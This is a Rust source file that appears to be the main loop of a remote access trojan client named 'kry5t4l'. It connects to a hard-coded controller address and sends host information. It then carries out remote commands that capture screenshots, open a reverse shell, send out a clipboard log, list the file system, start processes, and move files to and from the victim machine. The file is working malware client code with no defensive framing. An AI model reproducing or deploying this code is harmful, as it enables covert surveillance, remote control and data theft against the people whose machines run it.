use std::{fs::{self, File}, io::{self, Read}, path::Path, sync::{atomic::AtomicU64, mpsc::channel, Arc}, time::Duration};
use std::sync::atomic::Ordering::Relaxed;
use flate2::{bufread::ZlibEncoder, Compression};
use uuid::Uuid;
use lazy_static::*;
mod modules;
use kry5t4l_share::{
    self, 
    modules::{
        connection_manager::ClientConnector,
        protocol::{FileTransfer, Message, Protocol, Serializable}, 
        CommandType
    }
};

use crate::modules::{
    clipboard_manger, connect_manager, file_manager::{self, generate_unique_filename}, screen_manager::ScreenCaptureManager, shell_manager::{handle_reverse_shell, start_createprocess_thread}
};


const G_PROTOCOL_TYPE: Protocol = Protocol::TCP;
const G_ADDRESS: &str = "192.168.18.202:3378";

lazy_static! {
    static ref G_OUT_BYTES : Arc<AtomicU64> = Arc::new(AtomicU64::new(0));
    static ref G_IN_BYTES : Arc<AtomicU64> = Arc::new(AtomicU64::new(0));
}

fn main() {
    let clientid = Uuid::new_v4().to_string();

    clipboard_manger::start_heartbeat_thread();

    loop {
        let mut client = match ClientConnector::connect(
            &G_PROTOCOL_TYPE, 
            &G_ADDRESS
        ) {
            Ok(p) => p,
            Err(e) => {
                println!("connect faild: {}", e);
                std::thread::sleep(Duration::from_secs(5));
                continue;
            }
        };

        println!("connect success!");

        let host_os_info = connect_manager::get_host_info();

        let mut buf: Vec<u8> = match Message::to_bytes(
            CommandType::HostOSInfo.to_u8(), 
            &clientid, 
            &host_os_info.to_bytes()
        ) {
            Ok(p) => p,
            Err(e) => {
                println!("make HostOSInfo packet faild: {}", e);
                client.close();
                continue;
            }
        };

        println!("=========================================");

        println!("CommandType::HostOSInfo {:?}", buf);

        println!("=========================================");

        match client.send(&mut buf) {
            Ok(p) => p,
            Err(e) => {
                println!("send HostOsInfo packet faild: {}", e);
                client.close();
                continue;
            }
        };

        let (sender, receiver) = channel::<Vec<u8>>();
        connect_manager::start_sender_thread(client.clone(), receiver);
        connect_manager::start_heartbeat_thread(clientid.clone(), sender.clone());
        file_manager::start_get_file_info_thread();

        let mut buf222 = vec![];
        loop {
            match client.recv() {
                Ok(buf) => {
                    G_IN_BYTES.fetch_add(buf.len() as u64, Relaxed);
                    println!("revc [{}] bytes", buf.len());

                    match CommandType::from(buf[0]) {
                        CommandType::Screenshot => {
                            if buf[1] == 1 {
                                let mut capture_manager = ScreenCaptureManager::new();

                                capture_manager.start_capture(CommandType::Screenshot, clientid.clone(), sender.clone());

                                buf222.push(capture_manager);
                            } else {
                                let mut capture_manager = buf222.pop().unwrap();
                                capture_manager.stop_capture();
                            }
                        }
                        CommandType::ReverseShell =>{
                                                handle_reverse_shell(&buf[1..]);
                                             }
                        CommandType::HostOSInfo => (),
                        CommandType::Clipboard => {
                                                let mut file_data = Vec::new();

                                                match File::open("kry5t4l_clipboard_log") {
                                                    Ok(mut file) => {
                                                        if let Err(e) = file.read_to_end(&mut file_data) {
                                                            file_data.clear();
                                                            file_data = format!("Error: {}", e).as_bytes().to_vec();
                                                        }
                                                    }
                                                    Err(e) => {
                                                        file_data.clear();
                                                        file_data = format!("Error: {}", e).as_bytes().to_vec();
                                                    }
                                                };

                                                let reader = io::BufReader::new(&file_data[..]);

                                                let mut encoder = ZlibEncoder::new(reader, Compression::default());
                                                let mut compressed_data = Vec::new();
                                                let _ = encoder.read_to_end(&mut compressed_data);

                                                if let Some(packet) = Message::to_bytes(
                                                    CommandType::Clipboard.to_u8(), 
                                                    &clientid.clone(), 
                                                    &compressed_data).ok() {
                                                    if sender.send(packet).is_err() {
                                                        eprintln!("channel closed");
                                                    }
                                                }
                        }
                        CommandType::FileSystemInfo => {
                                                file_manager::file_transfer(
                                                    "./filejson".to_string(), 
                                                    "".to_owned(), 
                                                    CommandType::FileSystemInfo, 
                                                    clientid.clone(), 
                                                    sender.clone()
                                                );
                                            }
                        CommandType::Heartbeat => (),
                        CommandType::CreateProcess => {
                                                let process_name = String::from_utf8(buf[1..].to_vec()).unwrap();
                                                start_createprocess_thread(process_name.clone(), clientid.clone(), sender.clone());
                                            }
                        CommandType::Download => {
                                                let ft = FileTransfer::from_bytes(&buf[1..]).unwrap();
                                                let path = ft.dst_path.trim_end_matches(&['\\', '/'][..]).to_string();
                                                if ft.status == "Success" {
                                                    file_manager::file_transfer(
                                                        path, 
                                                        "".to_owned(), 
                                                        CommandType::Download, 
                                                        clientid.clone(), 
                                                        sender.clone()
                                                    );
                                                }
                                            }
                        CommandType::Upload => {
                                                let ft = FileTransfer::from_bytes(&buf[1..]).unwrap();
                                                let path = ft.src_path.trim_end_matches(&['\\', '/'][..]);
                                                let path = Path::new(path);
                                                let file_name = path.file_name().unwrap().to_string_lossy();
                                                let dst_path = ft.dst_path + &file_name;
                                                println!("Original destination path: {}", dst_path);
                                                let new_path = generate_unique_filename(dst_path.into());

                                                let mut status  = String::new();

                                                if ft.status.clone() == "Success" {
                                                    match fs::write(&new_path, ft.file_data) {
                                                        Ok(_) => status = format!("Success:{}&{}", ft.src_path, new_path.to_string_lossy()),
                                                        Err(e) => status = format!("Error:{}&{}", ft.src_path, e),
                                                    };
                                                }
                                                
                                                if let Some(packet) = Message::to_bytes(CommandType::Upload.to_u8(), &clientid.clone(), &status.as_bytes()).ok() {
                                                    if sender.send(packet).is_err() {
                                                        eprintln!("channel closed");
                                                    }
                                                }
                                            }
                        CommandType::Unknow =>(),

                    }
                }
                Err(e) => {
                    println!("connection recv faild : {}", e);
                    client.close();
                    break;
                },
            }
        }
    }    
}


